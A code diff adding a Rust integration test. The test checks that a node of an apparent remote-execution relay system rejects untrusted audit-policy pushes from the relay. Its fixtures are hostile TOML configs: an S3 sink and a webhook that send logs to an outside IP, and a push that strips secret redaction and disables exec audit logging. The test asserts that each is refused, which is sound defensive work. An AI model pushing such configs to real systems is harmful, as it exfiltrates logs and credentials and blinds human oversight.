@@ -236,6 +236,216 @@ async fn flow() -> anyhow::Result<()> {
     Ok(())
 }
 
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn untrusted_relay_audit_push_cannot_inject_egress_or_blind_legacy_unlocked_node() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let relay = RelayHandle::spawn(RelayConfig {
+        bind: "127.0.0.1:0".parse().expect("bind"),
+        data_dir: dir.path().join("relay"),
+        capture: None,
+        database_url: None,
+        allow_signup: false,
+        bootstrap_admin: false,
+        db_schema: None,
+        trust_proxy: Vec::new(),
+        print_admin_token: false,
+        legacy_admin_override: Some((true, Some(86_400))),
+    })
+    .await
+    .expect("spawn relay");
+    let relay_url = format!("wss://{}/v1/connect", relay.local_addr);
+    let admin = Client::connect(&ClientSettings {
+        relay: relay_url.clone(),
+        token: relay.admin_token.clone(),
+        fingerprint: relay.fingerprint.clone(),
+        trust: None,
+    })
+    .await
+    .expect("connect admin");
+
+    // 1. Default preset node (no explicit lock_local override) must lock local audit by default.
+    let fresh_tok = admin
+        .create_pairing_token("fresh-box", NodePolicy::exec(), 600)
+        .await
+        .expect("pair fresh");
+    let fresh_dir = dir.path().join("fresh-box");
+    std::fs::create_dir_all(&fresh_dir).expect("mkdir fresh");
+    let fresh_stop = CancellationToken::new();
+    let fresh_task = tokio::spawn(run(
+        NodeConfig {
+            relay_url: relay_url.clone(),
+            fingerprint: relay.fingerprint.clone(),
+            trust: None,
+            data_dir: fresh_dir.clone(),
+            name: "fresh-box".into(),
+            pairing_token: Some(fresh_tok.token),
+            root: None,
+            max_policy: NodePolicy::phase1_ceiling(),
+            version: "test".into(),
+            extensions: Vec::new(),
+            policy_hook: None,
+            capture: None,
+        },
+        fresh_stop.clone(),
+    ));
+    wait_online(&admin, "fresh-box").await;
+    let mut benign = AuditPolicy::preset("standard").expect("preset");
+    benign.lock_local = false;
+    benign.recording.mode = "always".into();
+    admin
+        .set_audit_policy("fresh-box", None, &benign.to_toml().expect("toml"))
+        .await
+        .expect("relay push to fresh-box");
+    tokio::time::sleep(Duration::from_millis(250)).await;
+    assert!(
+        !fresh_dir.join("audit.toml").exists(),
+        "default node without lock_local=false must ignore unauthenticated relay audit push"
+    );
+    fresh_stop.cancel();
+    let _ = tokio::time::timeout(Duration::from_secs(5), fresh_task).await;
+
+    // 2. Upgraded legacy node with pre-existing `lock_local = false` in audit.toml on disk.
+    let legacy_tok = admin
+        .create_pairing_token("legacy-box", NodePolicy::exec(), 600)
+        .await
+        .expect("pair legacy");
+    let legacy_dir = dir.path().join("legacy-box");
+    std::fs::create_dir_all(&legacy_dir).expect("mkdir legacy");
+    let legacy_initial = r#"preset = "standard"
+lock_local = false
+"#;
+    std::fs::write(legacy_dir.join("audit.toml"), legacy_initial).expect("write legacy audit.toml");
+    let legacy_stop = CancellationToken::new();
+    let legacy_task = tokio::spawn(run(
+        NodeConfig {
+            relay_url: relay_url.clone(),
+            fingerprint: relay.fingerprint.clone(),
+            trust: None,
+            data_dir: legacy_dir.clone(),
+            name: "legacy-box".into(),
+            pairing_token: Some(legacy_tok.token),
+            root: None,
+            max_policy: NodePolicy::phase1_ceiling(),
+            version: "test".into(),
+            extensions: Vec::new(),
+            policy_hook: None,
+            capture: None,
+        },
+        legacy_stop.clone(),
+    ));
+    wait_online(&admin, "legacy-box").await;
+
+    // Attempt A: malicious S3 credential-exfiltration sink pushed over relay to lock_local=false node.
+    let s3_exfil = r#"preset = "standard"
+lock_local = false
+
+[[sinks]]
+name = "local"
+kind = "local"
+data = ["logs", "diffs", "recordings"]
+
+[[sinks]]
+name = "exfil"
+kind = "s3"
+data = ["logs"]
+[sinks.s3]
+bucket = "loot"
+region = "us-east-1"
+endpoint = "https://93.184.216.34/s3"
+credentials = "env"
+"#;
+    admin
+        .set_audit_policy("legacy-box", None, s3_exfil)
+        .await
+        .expect("relay accepts syntactically valid s3 policy");
+    tokio::time::sleep(Duration::from_millis(250)).await;
+    let on_disk = std::fs::read_to_string(legacy_dir.join("audit.toml")).expect("read audit.toml");
+    assert!(
+        !on_disk.contains("exfil") && !on_disk.contains("93.184.216.34"),
+        "legacy lock_local=false node accepted untrusted S3 sink injection: {on_disk}"
+    );
+
+    // Attempt B: malicious alert webhook injection pushed over relay to lock_local=false node.
+    let webhook_exfil = r#"preset = "standard"
+lock_local = false
+
+[[alerts]]
+name = "leak"
+webhook = "https://93.184.216.34/hook"
+"#;
+    admin
+        .set_audit_policy("legacy-box", None, webhook_exfil)
+        .await
+        .expect("relay accepts syntactically valid public webhook policy");
+    tokio::time::sleep(Duration::from_millis(250)).await;
+    let on_disk = std::fs::read_to_string(legacy_dir.join("audit.toml")).expect("read audit.toml");
+    assert!(
+        !on_disk.contains("leak") && !on_disk.contains("93.184.216.34"),
+        "legacy lock_local=false node accepted untrusted webhook injection: {on_disk}"
+    );
+
+    // Attempt C: stripping redaction or disabling local exec logging via untrusted relay push.
+    let blind_push = r#"preset = "standard"
+lock_local = false
+
+[redact]
+patterns = []
+env_keys = []
+
+[categories.exec]
+enabled = false
+detail = "off"
+"#;
+    admin
+        .set_audit_policy("legacy-box", None, blind_push)
+        .await
+        .expect("relay accepts syntactically valid policy");
+    tokio::time::sleep(Duration::from_millis(250)).await;
+    let parsed = AuditPolicy::parse(
+        &std::fs::read_to_string(legacy_dir.join("audit.toml")).expect("read audit.toml"),
+    )
+    .expect("parse on-disk audit.toml");
+    assert!(
+        parsed.categories.get("exec").is_some_and(|c| c.enabled),
+        "untrusted relay push disabled local exec audit"
+    );
+    assert!(
+        !parsed.redact.patterns.is_empty() && !parsed.redact.env_keys.is_empty(),
+        "untrusted relay push stripped secret redaction"
+    );
+
+    // Benign push on explicit lock_local=false node: raising detail / enabling recording without egress.
+    let mut safe_push = AuditPolicy::parse(legacy_initial).expect("parse legacy");
+    safe_push.recording.mode = "always".into();
+    safe_push
+        .set_key("categories.file_write.detail", "diff")
+        .expect("set detail");
+    let safe_toml = safe_push.to_toml().expect("safe toml");
+    admin
+        .set_audit_policy("legacy-box", None, &safe_toml)
+        .await
+        .expect("relay benign push");
+    let deadline = std::time::Instant::now() + Duration::from_secs(5);
+    loop {
+        let cur = AuditPolicy::parse(
+            &std::fs::read_to_string(legacy_dir.join("audit.toml")).expect("read audit.toml"),
+        )
+        .expect("parse updated");
+        if cur.recording.mode == "always" {
+            assert!(!cur.lock_local);
+            break;
+        }
+        assert!(
+            std::time::Instant::now() < deadline,
+            "benign detail upgrade did not apply on lock_local=false node"
+        );
+        tokio::time::sleep(Duration::from_millis(50)).await;
+    }
+
+    legacy_stop.cancel();
+    let _ = tokio::time::timeout(Duration::from_secs(5), legacy_task).await;
+}
+
 async fn wait_online(admin: &Client, name: &str) {
     let deadline = std::time::Instant::now() + Duration::from_secs(15);
     loop {
